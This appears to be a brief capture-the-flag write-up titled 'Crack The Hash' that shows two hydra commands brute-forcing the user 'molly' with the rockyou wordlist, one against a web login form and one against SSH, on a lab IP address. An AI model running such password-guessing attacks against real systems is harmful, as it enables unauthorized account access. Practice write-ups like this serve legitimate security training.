# Crack The Hash

* ### WEB
```bash
hydra -l molly -P rockyou.txt 10.10.43.93 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect"
```
![image](https://github.com/lufffe/Writeups/assets/90646635/9746fcd7-19e0-4f0d-bb0c-64dac103be07)

* ### SSH
```bash
hydra -l molly -P rockyou.txt 10.10.43.93 ssh
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5b8654c1-88c7-4c73-ae8f-f74fa8deb10b)






